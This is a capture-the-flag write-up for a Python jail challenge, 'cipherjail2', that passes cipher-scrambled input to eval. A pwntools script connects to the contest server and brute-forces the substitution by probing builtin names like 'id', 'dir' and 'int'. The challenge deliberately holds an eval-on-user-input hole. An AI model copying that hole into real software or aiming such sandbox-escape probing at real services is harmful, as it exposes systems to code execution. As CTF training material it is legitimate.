# cipherjail2

## challenge

```py
#!/usr/local/bin/python3
from secrets import choice

flag = 'REDACTED'
# keep non-flag var names over 4 chars
attempts = 300
print("NICE GUARD: I snuck a 0 on the end of the number of attempts and the mean guard didn't notice!")
alphabet = 'abcdefghijklmnopqrstuvwxyz'

def gen_cipher(alphabet=alphabet):
    while True:
        unused = alphabet
        cipher = dict()
        for chara in alphabet[:-1]:
            newchar = choice(unused.replace(chara,''))
            unused = unused.replace(newchar,'')
            cipher[chara] = newchar
        if alphabet[-1] != unused:
            cipher[alphabet[-1]] = unused
            return cipher

cipher = gen_cipher()

def sanitize(string,cipher=cipher):
    string = ''.join([chara if chara in alphabet else '' for chara in string])
    if len(string) > 4:
        string = string[:4]
    return ''.join([cipher[chara] for chara in string])

print("NICE GUARD: I'm gonna let you 'IN' on a little secret:")
print("NICE GUARD: i = "+[*cipher.keys()][[*cipher.values()].index('i')])
print("NICE GUARD: n = "+[*cipher.keys()][[*cipher.values()].index('n')])

for _ in range(attempts):
    try:
        print(eval(sanitize(input('> '))))
    except Exception:
        print('MEAN GUARD: smh')
```

The nice guard was replaced by a mean guard who took away your apostrophe privileges, but the nice guard felt bad for you and slipped you some help.

## solution

you can use the builtins to find out other chars (gambling method)

gamble to find `all`, `len`, `iter`, `int`, `dir`, `id` in that order (there is also one other way to do it)

```py
q = ['None', 'True', 'abs', 'all', 'any', 'bin', 'bool', 'chr', 'dict', 'dir', 'eval', 'exec', 'exit',
 'hash', 'help', 'hex', 'id', 'int', 'iter', 'len', 'list', 'map', 'max', 'min', 'next', 'oct',
 'open', 'ord', 'pow', 'quit', 'repr', 'set', 'str', 'sum', 'type', 'vars', 'zip']

# d: id
# t: int
# m: min
# b: bin
# r: dir
# c: dict
# s: str
# o: oct
# e: iter
# h: chr
# p: open
# u: sum
# l: len/list
# x: hex/next/exit
# a: abs/all
# y: any

# all,len,iter,int,dir,id
# all,list,str,int,dir,id

# ['None', 'True', 'all', 'any', 'bool', 'eval', 'exec', 'hash', 'pow', 'quit', 'repr', 'type', 'vars', 'zip']

#gettable = ['d', 't', 'm', 'b', 'i', 'n', 'r', 'c', 's', 'o', 'e', 'h', 'a', 'x', 'l', 'u', 'p']
#print([f for f in q if sum(c in f for c in gettable) == len(f)-1])

from pwn import *

def create():
    return remote('ictf.031337.xyz', 42130)
    #return process(['python3', 'chall.py'])


rm = {}  # reverse map
uk = "abcdefghijklmnopqrstuvwxyz"  # unknown


def remuk(c):
    global uk
    assert c in uk, 'wtf!!!!!!!!!!'
    uk = uk[:uk.index(c)] + uk[uk.index(c)+1:]


while True:
    uk = "abcdefghijklmnopqrstuvwxyz"  # unknown
    rm = {}
    p = create()
    def attempt(s: str):
        p.sendline(s.encode())
        rc = p.recvline()
        if b'ictf' in rc:
            print(rc)
            exit()
        #print(rc)
        return b'smh' not in rc

    p.recvuntil(b'i = ')
    rm['i'] = p.recv(1).decode()
    p.recvuntil(b'n = ')
    rm['n'] = p.recv(1).decode()
    print('i <-', rm['i'])
    print('n <-', rm['n'])
    remuk(rm['i'])
    remuk(rm['n'])
    p.recvuntil(b'> ')
    for l in uk:
        if attempt(rm['i'] + l):
            rm['d'] = l
            print('d <-', rm['d'])
            remuk(rm['d'])
            break
    for l in uk:
        if attempt(rm['d'] + rm['i'] + l):
            rm['r'] = l
            print('r <-', rm['r'])
            remuk(rm['r'])
            break
    for l in uk:
        if attempt(rm['i'] + rm['n'] + l):
            rm['t'] = l
            print('t <-', rm['t'])
            remuk(rm['t'])
            break
    for l in uk:
        if attempt(l + rm['t'] + rm['r']):
            rm['s'] = l
            print('s <-', rm['s'])
            remuk(rm['s'])
            break
    for l in uk:
        if attempt(l + rm['i'] + rm['s'] + rm['t']):
            rm['l'] = l
            print('l <-', rm['l'])
            remuk(rm['l'])
            break
    for l in uk:
        if attempt(l + rm['l'] + rm['l']):
            rm['a'] = l
            print('a <-', rm['a'])
            remuk(rm['a'])
            break
    for al in uk:
        for bl in uk:
            if al == bl:
                continue
            p.sendline(al + rm['l'] + rm['a'] + bl)
    break
p.interactive()
```
